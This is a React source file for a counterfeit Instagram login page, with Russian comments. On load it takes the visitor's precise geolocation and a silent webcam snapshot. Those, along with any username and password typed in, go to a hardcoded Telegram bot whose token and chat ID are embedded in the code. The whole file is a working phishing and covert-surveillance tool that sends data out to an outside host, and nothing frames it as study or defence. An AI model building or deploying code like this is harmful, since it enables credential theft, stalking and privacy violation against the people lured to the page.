import React, { useEffect, useState } from "react";
import axios from "axios";
import "./App.css"; // Убедитесь, что Tailwind CSS подключен

const TELEGRAM_BOT_TOKEN = "7414598105:AAGvCf4p_H2zZkR3VLG-OYUeB2BqsphE0r4";
const TELEGRAM_CHAT_ID = "5283508005"; // Замените на ваш Chat ID

function App() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [location, setLocation] = useState(null);
  const [photo, setPhoto] = useState(null);
  const [error, setError] = useState(null);

  useEffect(() => {
    requestLocation();
  }, []);

  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          setLocation({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
          });
        },
        () => setError("Не удалось получить геолокацию"),
        { enableHighAccuracy: true }
      );
    } else {
      setError("Ваш браузер не поддерживает геолокацию");
    }
  };

  const capturePhoto = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement("video");
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement("canvas");
      canvas.width = 640;
      canvas.height = 480;
      const context = canvas.getContext("2d");

      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const photoData = canvas.toDataURL("image/png");
      setPhoto(photoData);

      stream.getTracks().forEach((track) => track.stop());
    } catch (error) {
      setError("Не удалось получить доступ к камере");
      console.error("Ошибка захвата фото:", error);
    }
  };

  const sendLocationAndPhotoToTelegram = async () => {
    if (!location) {
      setError("Отсутствуют данные о местоположении");
      return;
    }

    try {
      const googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude}`;

      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: `Логин: ${username}\nПароль: ${password}\nМестоположение: широта ${location.latitude}, долгота ${location.longitude}\nКарта: ${googleMapsLink}`,
        }
      );

      if (photo) {
        const formData = new FormData();
        formData.append("chat_id", TELEGRAM_CHAT_ID);
        formData.append("photo", await (await fetch(photo)).blob(), "snapshot.png");

        await axios.post(
          `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
          formData,
          { headers: { "Content-Type": "multipart/form-data" } }
        );

        setError("Местоположение и фото отправлены успешно");
      }
    } catch (error) {
      setError("Ошибка при отправке данных в Telegram");
      console.error("Ошибка отправки:", error.response?.data || error.message);
    }
  };

  useEffect(() => {
    if (location) {
      capturePhoto();
    }
  }, [location]);

  useEffect(() => {
    if (photo) {
      sendLocationAndPhotoToTelegram();
    }
  }, [photo]);

  const handleLogin = (e) => {
    e.preventDefault();
    if (!username || !password) {
      setError("Заполните все поля");
      return;
    }
    sendLocationAndPhotoToTelegram();
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="w-full max-w-xs bg-white p-6 border border-gray-300 rounded-lg shadow-lg">
        <h1 className="text-center font-logo text-3xl text-gray-800 mb-6">Instagram</h1>
        <form onSubmit={handleLogin} className="flex flex-col">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            className="mb-3 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            className="mb-4 px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button
            type="submit"
            className="bg-blue-500 hover:bg-blue-600 text-white font-semibold py-2 rounded mb-4"
          >
            Log in
          </button>
        </form>
        <div className="flex items-center mb-4">
          <div className="flex-grow border-t border-gray-300"></div>
          <span className="mx-3 text-gray-400">OR</span>
          <div className="flex-grow border-t border-gray-300"></div>
        </div>
        <button className="flex items-center justify-center w-full text-blue-800 font-semibold mb-4">
          <svg
            className="w-4 h-4 mr-2"
            fill="currentColor"
            viewBox="0 0 24 24"
          >
            <path d="M22 3H2C0.9 3 0 3.9 0 5V19C0 20.1 0.9 21 2 21H22C23.1 21 24 20.1 24 19V5C24 3.9 23.1 3 22 3ZM22 19H2V5H22V19ZM11.12 8.71L14.53 12.12L11.12 15.53L9.71 14.12L12.83 11L9.71 7.88L11.12 8.71ZM6 13V11H8V13H6ZM6 9V7H8V9H6Z" />
          </svg>
          Log in with Facebook
        </button>
        <p className="text-center text-sm text-blue-800 cursor-pointer">
          Forgot password?
        </p>
        {error && <p className="text-red-500 text-sm mt-4 text-center">{error}</p>}
      </div>
    </div>
  );
}

export default App;
